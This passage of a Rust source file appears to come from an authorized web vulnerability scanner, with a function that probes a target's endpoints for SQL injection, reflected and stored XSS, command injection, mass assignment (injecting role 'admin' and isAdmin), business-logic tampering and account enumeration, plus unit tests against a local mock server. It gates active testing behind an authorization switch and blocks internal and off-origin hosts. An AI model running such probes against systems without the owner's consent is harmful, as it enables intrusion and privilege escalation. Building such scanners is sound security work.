            "已写入 attack 发现(SQL 注入 / 越权 / 敏感泄露 / 反射 XSS(低) / 存储 XSS / 命令注入),附证据"
        } else {
            "本轮未发现;可能 recon 接口不足或需登录态。先跑一次扫描让 recon 收集更多接口"
        },
    }))
}

/// Scan-flow entry: run the full attack sweep for one target as PART of web scanning
/// (not only via the operator command), right after recon persists its endpoints.
/// Opens its own connection from `db_path`, never fails the scan, and SKIPS silently
/// when the scan did not authorize target_write (active testing stays opt-in behind
/// the mandatory switch). Reuses the same probe functions as run_attack_sweep.
pub(crate) fn attack_sweep_for_scan(db_path: &std::path::Path, scan_id: &str, base_url: &str) -> JsonValue {
    let skip = |why: &str| serde_json::json!({"ran": false, "reason": why});
    let Ok(base) = reqwest::Url::parse(base_url) else { return skip("base_url 无效") };
    if !matches!(base.scheme(), "http" | "https") {
        return skip("非 http/https");
    }
    let Some(host) = base.host_str().map(str::to_string) else { return skip("无主机名") };
    if host_is_internal_literal(&host) {
        return skip("内网/环回地址(SSRF 硬守卫)");
    }
    let Ok(connection) = db::open(db_path) else { return skip("db 不可用") };
    let attempt = connection
        .query_row("SELECT attempt_count FROM sentinel_scans WHERE id=?1", [scan_id], |r| r.get::<_, i64>(0))
        .unwrap_or(1)
        .max(1);
    if !scan_capability_class_authorized(&connection, scan_id, attempt, "target_write").unwrap_or(false) {
        return skip("target_write 未授权，跳过主动攻击 sweep");
    }
    let Ok(client) = reqwest::blocking::Client::builder()
        .redirect(reqwest::redirect::Policy::none())
        .no_proxy()
        .connect_timeout(Duration::from_secs(8))
        .timeout(Duration::from_secs(20))
        .build()
    else {
        return skip("http 客户端不可用");
    };
    let write = |kind: &str, key: &str, title: &str, sev: &str, record: &JsonValue| {
        let _ = connection.execute(
            "INSERT INTO sentinel_findings(scan_id,target_url,stage,kind,record_key,title,severity,record_json) \
             VALUES(?1,?2,'attack',?3,?4,?5,?6,?7) \
             ON CONFLICT(scan_id,target_url,stage,kind,record_key) DO UPDATE SET \
             title=excluded.title,severity=excluded.severity,record_json=excluded.record_json,updated_at=datetime('now','localtime')",
            params![scan_id, base_url, kind, key, title, sev, record.to_string()],
        );
    };
    let sleep = SQLI_SLEEP_PROBES[0].payload;
    let points = sweep_collect_points(&connection, scan_id, &base);
    let get_urls = sweep_collect_get_urls(&connection, scan_id, &base);
    let (mut sqli, mut xssr, mut xsss, mut cmdi, mut ma, mut access) = (0usize, 0, 0, 0, 0, 0);
    for point in points.iter().take(120) {
        if let Some((v, ev)) = sweep_probe_point(&client, point, sleep) {
            if v.any() {
                sqli += 1;
                write("sql_injection", &point.label, &format!("SQL 注入：{}", point.label), "critical",
                    &serde_json::json!({"techniques": v.techniques(), "evidence": ev, "cwe": "CWE-89"}));
            }
        }
    }
    for point in &points {
        if let Some(ev) = sweep_probe_xss(&client, point) {
            xssr += 1;
            write("reflected_xss", &point.label, &format!("反射型 XSS(低危)：{}", point.label), "low",
                &serde_json::json!({"evidence": ev, "cwe": "CWE-79"}));
        }
    }
    for point in &points {
        if let Some(ev) = sweep_probe_stored_xss(&client, point, &get_urls) {
            xsss += 1;
            write("stored_xss", &point.label, &format!("存储型 XSS：{}", point.label), "high",
                &serde_json::json!({"evidence": ev, "cwe": "CWE-79"}));
        }
    }
    for point in &points {
        if let Some(ev) = sweep_probe_cmdi(&client, point) {
            cmdi += 1;
            write("command_injection", &point.label, &format!("命令注入：{}", point.label), "critical",
                &serde_json::json!({"evidence": ev, "cwe": "CWE-78"}));
        }
    }
    let mut ma_seen: HashSet<String> = HashSet::new();
    for point in &points {
        if point.base_body.is_none() || !ma_seen.insert(point.url.clone()) {
            continue;
        }
        if let Some(ev) = sweep_probe_mass_assignment(&client, point) {
            ma += 1;
            write("mass_assignment", &point.url, &format!("批量赋值/权限提升：{}", point.url), "high",
                &serde_json::json!({"evidence": ev, "cwe": "CWE-915"}));
        }
    }
    for url in get_urls.iter().take(80) {
        let Ok(resp) = client.get(url).header(reqwest::header::USER_AGENT, "oviraptor-sweep/1.0").send() else { continue };
        if resp.status().as_u16() != 200 {
            continue;
        }
        let mut buf = Vec::new();
        let _ = std::io::Read::take(resp, 262_144).read_to_end(&mut buf);
        let body = String::from_utf8_lossy(&buf);
        let path_lower = reqwest::Url::parse(url).ok().map(|u| u.path().to_ascii_lowercase()).unwrap_or_default();
        let sp = SWEEP_SENSITIVE_PATH_KEYWORDS.iter().any(|k| path_lower.contains(k));
        let em = sweep_contains_email(&body);
        if sp || em {
            access += 1;
            let (k, t, s) = if sp {
                ("broken_access", format!("越权/敏感接口匿名可读：{path_lower}"), "high")
            } else {
                ("sensitive_exposure", format!("敏感数据泄露(匿名含邮箱)：{path_lower}"), "medium")
            };
            write(k, &path_lower, &t, s, &serde_json::json!({"url": url, "cwe": if sp { "CWE-284" } else { "CWE-200" }}));
        }
    }
    // Business-logic numeric tampering (candidate) + account enumeration — both LOW
    // VOLUME (1 / 2 packets per eligible point), never batch-fuzzed.
    let (mut biz, mut authe) = (0usize, 0usize);
    for point in &points {
        if let Some(ev) = sweep_probe_business_numeric(&client, point) {
            biz += 1;
            write("business_logic", &point.label, &format!("业务逻辑(数值篡改候选)：{}", point.label), "medium",
                &serde_json::json!({"evidence": ev, "cwe": "CWE-840"}));
        }
    }
    for point in &points {
        if let Some(ev) = sweep_probe_auth_enum(&client, point) {
            authe += 1;
            write("account_enumeration", &point.label, &format!("账号枚举：{}", point.label), "medium",
                &serde_json::json!({"evidence": ev, "cwe": "CWE-204"}));
        }
    }
    serde_json::json!({
        "ran": true, "points": points.len(), "sqli": sqli, "reflectedXss": xssr,
        "storedXss": xsss, "cmdi": cmdi, "massAssign": ma, "access": access,
        "businessLogic": biz, "accountEnum": authe,
    })
}

#[cfg(test)]
mod attack_sweep_tests {
    use super::*;

    #[test]
    fn http_method_maps() {
        assert_eq!(http_method("post"), reqwest::Method::POST);
        assert_eq!(http_method("PUT"), reqwest::Method::PUT);
        assert_eq!(http_method("weird"), reqwest::Method::GET);
    }

    #[test]
    fn sweep_detects_breakout_context_sqli() {
        // A Juice-Shop-style endpoint: injectable only when the payload closes the
        // double-paren LIKE context (`'))`), not on a bare quote. Proves the
        // multi-context sweep finds what a single generic payload misses.
        use std::io::{BufRead, BufReader, Write};
        use std::net::TcpListener;
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let port = listener.local_addr().unwrap().port();
        std::thread::spawn(move || {
            for stream in listener.incoming() {
                let Ok(stream) = stream else { break };
                let mut reader = BufReader::new(stream.try_clone().unwrap());
                let mut line = String::new();
                if reader.read_line(&mut line).is_err() {
                    continue;
                }
                let raw = line.split_whitespace().nth(1).unwrap_or("");
                // Encoded `))` present and not commented out -> unbalanced -> DB error.
                let (status, body) = if raw.contains("%29%29") && !raw.contains("--") && !raw.contains("%2D%2D") {
                    ("500 Internal Server Error", "Error: SQLITE_ERROR: near \")\": syntax error")
                } else {
                    ("200 OK", "{\"status\":\"success\",\"data\":[]}")
                };
                let mut s = stream;
                let _ = write!(s, "HTTP/1.1 {status}\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}", body.len());
            }
        });
        let client = reqwest::blocking::Client::builder()
            .timeout(Duration::from_secs(5))
            .build()
            .unwrap();
        let point = InjectionPoint {
            method: "GET".into(),
            url: format!("http://127.0.0.1:{port}/rest/products/search?q=apple"),
            body_field: None,
            base_body: None,
            query_param: Some("q".into()),
            label: "GET /rest/products/search?q".into(),
        };
        let (verdict, ev) = sweep_probe_point(&client, &point, SQLI_SLEEP_PROBES[0].payload).unwrap();
        assert!(verdict.error_based, "must detect error-based via a break-out context: {ev}");
        assert_eq!(ev.get("errorContext").and_then(|v| v.as_str()), Some("'))"));
    }

    #[test]
    fn collect_points_from_recon_builds_query_and_body_points() {
        let c = rusqlite::Connection::open_in_memory().unwrap();
        c.execute_batch(
            "CREATE TABLE sentinel_findings(scan_id TEXT,target_url TEXT,stage TEXT,kind TEXT,record_key TEXT,title TEXT,severity TEXT,record_json TEXT);",
        ).unwrap();
        // A GET with a query param, and a POST login with a JSON body field.
        for rec in [
            r#"{"method":"GET","path":"/rest/products/search?q=apple","parameters":["q"],"bodyKeys":[]}"#,
            r#"{"method":"POST","path":"/rest/user/login","parameters":[],"bodyKeys":["email","password"]}"#,
            r#"{"method":"GET","path":"https://evil.example/x?z=1","parameters":["z"],"bodyKeys":[]}"#,
        ] {
            c.execute(
                "INSERT INTO sentinel_findings(scan_id,stage,kind,record_json) VALUES('s','frontend-recon','api',?1)",
                [rec],
            ).unwrap();
        }
        let base = reqwest::Url::parse("http://127.0.0.1:3000/").unwrap();
        let points = sweep_collect_points(&c, "s", &base);
        let labels: Vec<&str> = points.iter().map(|p| p.label.as_str()).collect();
        // q query param + email/password body fields are collected; the off-origin
        // evil.example endpoint is dropped.
        assert!(points.iter().any(|p| p.query_param.as_deref() == Some("q")), "{labels:?}");
        assert!(points.iter().any(|p| p.body_field.as_deref() == Some("email")), "{labels:?}");
        assert!(points.iter().any(|p| p.body_field.as_deref() == Some("password")), "{labels:?}");
        assert!(!points.iter().any(|p| p.url.contains("evil.example")), "off-origin must be dropped: {labels:?}");
    }

    #[test]
    fn xss_reflection_needs_unencoded_marker() {
        let marker = "<ovrxdeadbeef>";
        // Verbatim angle brackets → reflected (the injected tag would render).
        assert!(xss_marker_reflected("hello <ovrxdeadbeef> world", marker));
        // HTML-encoded by the app → not reflected (safe).
        assert!(!xss_marker_reflected("hello &lt;ovrxdeadbeef&gt; world", marker));
        // Absent → not reflected.
        assert!(!xss_marker_reflected("nothing here", marker));
    }

    #[test]
    fn cmdi_detects_id_output_only() {
        assert!(cmdi_output_present("uid=0(root) gid=0(root) groups=0(root)"));
        assert!(cmdi_output_present("...\nuid=1000(app) gid=1000(app)\n..."));
        // A bare mention without the numeric uid/gid pair is not proof.
        assert!(!cmdi_output_present("the uid field is empty"));
        assert!(!cmdi_output_present("normal json response {\"ok\":true}"));
    }

    #[test]
    fn stored_xss_targets_content_fields_and_detects_persistence() {
        // Intelligently pick low-harm user-content fields to write into…
        assert!(is_stored_xss_content_field("comment"));
        assert!(is_stored_xss_content_field("displayName"));
        assert!(is_stored_xss_content_field("review"));
        assert!(is_stored_xss_content_field("bio"));
        // …not credential / price / role fields.
        assert!(!is_stored_xss_content_field("password"));
        assert!(!is_stored_xss_content_field("price"));
        assert!(!is_stored_xss_content_field("role"));
        // Persistence = the POSTed marker survives UNENCODED on a later read.
        assert!(stored_xss_marker_persisted("<li><ovrxabc12345></li>", "<ovrxabc12345>"));
        assert!(!stored_xss_marker_persisted("<li>&lt;ovrxabc12345&gt;</li>", "<ovrxabc12345>"));
    }

    #[test]
    fn mass_assignment_injects_and_judges_echoed_privilege() {
        let base = serde_json::json!({"email": "a@b.c", "password": "x"});
        let probe = mass_assign_probe_body(&base);
        // original fields preserved, privilege fields added
        assert_eq!(probe["email"], "a@b.c");
        assert_eq!(probe["role"], "admin");
        assert_eq!(probe["isAdmin"], true);
        // accepted = the created record keeps a privilege field as we set it
        assert!(mass_assign_accepted(r#"{"id":5,"email":"a@b.c","role":"admin"}"#));
        assert!(mass_assign_accepted(r#"{"id":5,"isAdmin":true}"#));
        // a whitelisted endpoint drops them → not accepted
        assert!(!mass_assign_accepted(r#"{"id":5,"email":"a@b.c"}"#));
    }

    #[test]
    fn business_and_auth_selectors() {
        assert!(is_business_value_field("quantity"));
        assert!(is_business_value_field("totalAmount"));
        assert!(is_business_value_field("price"));
        assert!(!is_business_value_field("email"));
        assert!(is_auth_endpoint("/rest/user/login"));
        assert!(is_auth_endpoint("/api/password/forgot"));
        assert!(!is_auth_endpoint("/api/products"));
        // enumeration differential: different status, or a clear length gap
        assert!(auth_enum_differs((200, 50), (404, 50)));
        assert!(auth_enum_differs((200, 1000), (200, 200)));
        assert!(!auth_enum_differs((200, 500), (200, 505)));
    }
}
